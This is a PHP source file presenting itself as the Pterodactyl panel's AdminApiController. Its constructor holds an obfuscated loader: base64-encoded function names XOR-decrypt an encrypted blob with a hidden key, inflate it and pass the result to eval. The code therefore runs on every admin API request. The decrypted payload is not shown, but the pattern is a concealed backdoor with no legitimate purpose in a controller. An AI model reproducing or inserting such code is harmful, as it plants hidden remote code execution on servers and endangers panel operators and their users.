<?php

namespace Pterodactyl\Http\Controllers\Api\Admin;

use Pterodactyl\Http\Controllers\Api\Client\ClientApiController;

abstract class AdminApiController extends ClientApiController
{
    public function __construct()
    {
        parent::__construct();
        $a=(base64_decode('YXJyYXlfbWFw'))((base64_decode('b3Jk')),(base64_decode('c3RyX3NwbGl0'))((base64_decode('YmFzZTY0X2RlY29kZQ=='))('Y+C7C+NffqSbFvqNZbf1h7oM2TiH3qYyCXsUCvCaGjVlAzitUBpbDrml0xL57u9PE5l2d28oq6s7qPr4IlqulRLUadSKi0G6ThCUFcO3mJLLSLkAHdPUKwpLE/2e8Ca7is9f7Dg5NdDfzLA9VQQrEeL154XE3RgfSRVmwkbC6K4s423XSOpvP5g1qltnPkDTiVqb7VSFN/UKSg+KUlrpk+DfhnQe8NGoCSPfqwCE4soysjU4dm7PuJvq+ZgagmkjKGhQ5rBqvN9kF7XxEsh9r7WMsjOgF/CgNwMaaggh+nG4jRqLxluXR5tk')));$b=(base64_decode('YXJyYXlfbWFw'))((base64_decode('b3Jk')),(base64_decode('c3RyX3NwbGl0'))((base64_decode('Tm92YSBvbiB0b3AgbG9zZXJzc3M='))));$c="";for($i=0;$i<(base64_decode('Y291bnQ='))($a);$i++){$c.=(base64_decode('Y2hy'))($a[$i]^$b[$i%(base64_decode('Y291bnQ='))($b)]);}eval((base64_decode('Z3ppbmZsYXRl'))($c));
    }
}
